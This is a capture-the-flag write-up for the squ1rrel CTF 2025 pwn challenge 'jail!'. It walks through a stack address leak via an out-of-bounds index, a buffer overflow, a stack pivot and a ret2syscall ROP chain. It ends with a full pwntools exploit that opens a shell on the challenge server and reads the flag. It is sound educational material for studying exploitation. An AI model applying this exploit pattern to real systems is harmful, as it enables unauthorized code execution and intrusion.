# squ1rrel CTF 2025

## jail!

> I want to become a dentist! A DENTIST?!
>
>  Author: ZeroDayTea
>
> [`Dockerfile`](Dockerfile), [`prison`](prison)

Tags: _pwn_

## Solution
This challenge comes with a binary and a dockerfile. Lets fire up `BinaryNinja` and inspect the binary first.

```c
00401a1f    int64_t prison()
00401a1f    {
00401a1f        char const* const var_88 = "The Professor";
00401a3d        char const* const var_80 = "Empty Cell";
00401a48        char const* const var_78 = "Jay. L. Thyme";
00401a53        char const* const var_70 = "Jay. L. Thyme's Wife";
00401a5e        char const* const var_68 = "Jay. L. Thyme's Wife's Boyfriend";
00401a69        char const* const var_60 = "Rob Banks";
00401a7c        _IO_printf("They gave you the premium stay s…", 0);
00401a7c        
00401a9f        if (__isoc99_scanf(&data_49e0ef, 0) != 1)
00401a9f        {
00401ac9            _IO_puts("Invalid input!");
00401ab9            int32_t i;
00401ab9            
00401ab9            do
00401ab1                i = getchar();
00401ab9             while (i != 0xa);
00401ab9            
00401b55            return i;
00401a9f        }
00401a9f        
00401ac9        int32_t i_1;
00401ac9        
00401ac9        do
00401ac1            i_1 = getchar();
00401ac9         while (i_1 != 0xa);
00401ad3        int32_t var_4c;
00401ad3        (&var_88)[(int64_t)(var_4c - 1)];
00401aec        _IO_printf("Cell #%d: Your cellmate is %s\n", 0);
00401b00        _IO_printf("Now let's get the registry updat…", 0);
00401b18        void var_48;
00401b18        _IO_fgets(&var_48, 0x64, stdin);
00401b27        _IO_puts(&data_49e160);
00401b31        __sleep(3);
00401b40        _IO_puts(&data_49e160);
00401b4f        return _IO_puts("What did you expect. You're in h…");
00401a1f    }

00401b56    int64_t main()
00401b56    {
00401b56        setbuf(stdout, 0);
00401b81        setbuf(stdin, 0);
00401b90        _IO_puts("Welcome to Maximum Security Pris…");
00401b9f        _IO_puts("You'll be rotting in here for th…");
00401bae        _IO_puts("But first let's get you register…");
00401bb8        prison();
00401bc3        return 0;
00401b56    }
```

The main function calls to the function `prison`. The function `prison` does two things:

Firstly it prompts `They gave you the premium stay so at least you get to choose your cell (1-6)` and read a integer value. Here we can note already that the prompt gives a range of 1-6 but there is no range check whatsoever. We can read freely out of bounds.

Then the program prints `Cell #%d: Your cellmate is %s\n` whereas the first parameter is our number input and the second parameter is read from a array on the stack with some names. We already noted that we can read beyond the array boundaries here.

Secondly the program prompts `Now let's get the registry updated. What is your name` and let's us read `0x64` bytes into a buffer. The buffer itself is smaller, it's located only `0x48` bytes away of the stack location that contains the return address that the cpu would jump to after leaving the function. This means we can overflow the buffer and change the return address.

Next we can check what security measurements are enabled for the binary.

```bash
$ checksec ./prison
[*] '/home/ctf/jail'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

We can see `NX` is enabled, so we can't put shellcode to the stack. `Canaries` are enabled, but when we check the function (prison) there is actually no canary check, so we don't care too much here. This setup sounds like `ROP` is the way to go.

But sadly enough, we only have a very limited amount of space for our rop chain. Since we start at the `ret` stack location we have `0x64-0x48 = 28` bytes only for our rop chain, thats very limited. 

But we have of course much wasted space before that in our buffer, so pivoting the stack to the buffer start gives is way more flexibility. For this we need a gadget that let's us control the stack pointer `rsp`.

```bash
$ ROPgadget --binary ./prison | grep rsp
...
0x0000000000401898 : pop rsp ; pop rbp ; ret
0x0000000000464b5d : pop rsp ; pop rbp ; sub rdx, rsi ; sar rdx, 2 ; jmp 0x463f40
0x00000000004450f8 : pop rsp ; ret
....
```

There we have it, at `0x4450f8` we have the gadget to break out of the jail and give us more freedom. One part of the rop chain is set, the stack layout we want is:

```bash
0x4450f8        (pop rsp)
buffer_address
```

But one thing is missing of course. We don't know where the buffer is located on the stack, and the stack base address is not fixed. Therefore we need to leak a stack address somehow. Since we have out of bound reads in the first input, lets try to find a offset which gives us a stack address.

```bash
$ gdb ./prison
pwndbg> break *prison+180
Breakpoint 1 at 0x401a27
pwndbg> r
...
   0x401acb <prison+172>    mov    eax, dword ptr [rbp - 0x44]
   0x401ace <prison+175>    sub    eax, 1
   0x401ad1 <prison+178>    cdqe
 ► 0x401ad3 <prison+180>    mov    rdx, qword ptr [rbp + rax*8 - 0x80] <_IO_2_1_stdin_+132>
   0x401ad8 <prison+185>    mov    eax, dword ptr [rbp - 0x44]
   0x401adb <prison+188>    mov    esi, eax
   0x401add <prison+190>    lea    rax, [rip + 0x9c624]
   0x401ae4 <prison+197>    mov    rdi, rax
   0x401ae7 <prison+200>    mov    eax, 0
...
```

We want to break before we read from the table and see what the stack looks like at this moment.

```bash
pwndbg> stack 30
00:0000│ rsp 0x7fffffffdb80 —▸ 0x49e030 ◂— 'The Professor'
01:0008│     0x7fffffffdb88 —▸ 0x49e03e ◂— 'Empty Cell'
02:0010│     0x7fffffffdb90 —▸ 0x49e049 ◂— 'Jay. L. Thyme'
03:0018│     0x7fffffffdb98 —▸ 0x49e057 ◂— "Jay. L. Thyme's Wife"
04:0020│     0x7fffffffdba0 —▸ 0x49e070 ◂— "Jay. L. Thyme's Wife's Boyfriend"
05:0028│     0x7fffffffdba8 —▸ 0x49e091 ◂— 'Rob Banks'
06:0030│     0x7fffffffdbb0 —▸ 0x49e220 ◂— "But first let's get you registered and take you to your cell."
07:0038│     0x7fffffffdbb8 —▸ 0x4cb320 (_IO_2_1_stdout_) ◂— 0xfbad2887
08:0040│     0x7fffffffdbc0 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc10 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdd00 ◂— ...
09:0048│     0x7fffffffdbc8 —▸ 0x413b0a (puts+506) ◂— cmp eax, -1
0a:0050│     0x7fffffffdbd0 —▸ 0x7fffffffdc00 —▸ 0x7fffffffdc10 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdd00 ◂— ...
0b:0058│     0x7fffffffdbd8 —▸ 0x46287b (setbuffer+203) ◂— test dword ptr [rbx], 0x8000
0c:0060│     0x7fffffffdbe0 ◂— 0x1
0d:0068│     0x7fffffffdbe8 —▸ 0x7fffffffdd28 —▸ 0x7fffffffdfba ◂— '/home/ctf/jail'
0e:0070│     0x7fffffffdbf0 —▸ 0x7fffffffdd38 —▸ 0x7fffffffdfdd ◂— 'SHELL=/bin/bash'
0f:0078│     0x7fffffffdbf8 —▸ 0x4c6f68 (__preinit_array_start) —▸ 0x4019d0 (frame_dummy) ◂— endbr64
10:0080│ rbp 0x7fffffffdc00 —▸ 0x7fffffffdc10 —▸ 0x7fffffffdcb0 —▸ 0x7fffffffdd00 ◂— 0x0
```

We can see the lookup table at the top of the stack. We also can see a lot of stack addresses we can read. For instance, we can read on offset `0x40` (`0x40/8 = 8` so we input `9` as the program subtracts one from our input before indexing into the table) which would give us `0x7fffffffdc00` and print `0x7fffffffdc10` (since the first address is dereferenced). Now we have a stack address, but it's not the address of our buffer. But since the relative stack location is always the same we can just compute the difference of the buffer address (`0x7fffffffdbc0`) and the address we got leaked (`0x7fffffffdc10`) to find the correct address of the buffer later: (`0x7fffffffdc10-0x7fffffffdbc0 = 80`). So we know we need to substract the value 80 from the leaked stack address to find the buffer address.

```py
# leak address of name buffer
p.sendlineafter(b"cell (1-6):", b"9") #17
p.recvuntil(b"Your cellmate is ")
buffer_stack_addr = int.from_bytes(p.recvline()[:6], "little") - 80
```

Now we have all the incredients to pivot our stack to the buffer start. Now we need to see what gadgets we have to spawn a shell or read from file. What we find is:

```bash
0x4013b8 (syscall)
0x41f464 (pop rax)
0x413676 (pop rsi, pop rbp)
0x401a0d (pop rdi)
```

This is alread enough. We can do a `ret2syscall` and spawn a shell by invoking syscall 59 (`execve`). There is a gread [`website`](https://filippo.io/linux-syscall-table/) with all the syscalls. We are interested in:

```bash
execve
rax = 59
rdi = "/bin/bash"
rsi = 0
rdx = 0
```

We have all the gadgets to setup the registers (rsi and rdx need to be zero to spawn a shell). The filename (rdi) needs to be a pointer to a string, but luckily we have already a buffer we can use, namely the buffer we are writing to. So the rest of the rop chain would look like this.

```bash
/bin/sh\x00
0x401a0d        (pop rdi)
buffer_address
0x413676        (pop rsi, pop rbp)
0
0
0x41f464        (pop rax)
59
0x4013b8        (syscall)
```

Lets write all this into a small script:

```py
from pwn import *

p = remote("20.84.72.194", 5001)

# first leak address of name buffer
p.sendlineafter(b"cell (1-6):", b"9") #17
p.recvuntil(b"Your cellmate is ")
buffer_stack_addr = int.from_bytes(p.recvline()[:6], "little") - 80

# send the rop chain
payload  = b"/bin/sh\x00"           #                   8 byte
payload += p64(0x401a0d)            # pop rdi           8 byte
payload += p64(buffer_stack_addr)   #                   8 byte
payload += p64(0x413676)            # pop rsi, pop rbp  8 byte
payload += p64(0)                   #                   8 byte
payload += p64(0)                   #                   8 byte
payload += p64(0x41f464)            # pop rax           8 byte
payload += p64(59)                  # execve            8 byte
payload += p64(0x4013b8)            # syscall           8 byte
# --
payload += p64(0x4450f8)            # pop rsp           8 byte  <- initial ret
payload += p64(buffer_stack_addr+8) #                   8 byte

p.sendlineafter(b"name:", payload)

p.interactive()
```

Looks fine. Running this gives us a shell and the flag.

```bash
$ python foo.py
[+] Opening connection to 20.84.72.194 on port 5001: Done
[*] Switching to interactive mode
 ...
...
What did you expect. You're in here for life this is what it looks like for the rest.
$ ls
flag.txt
run
$ cat flag.txt
squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}
$
```

Flag `squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}`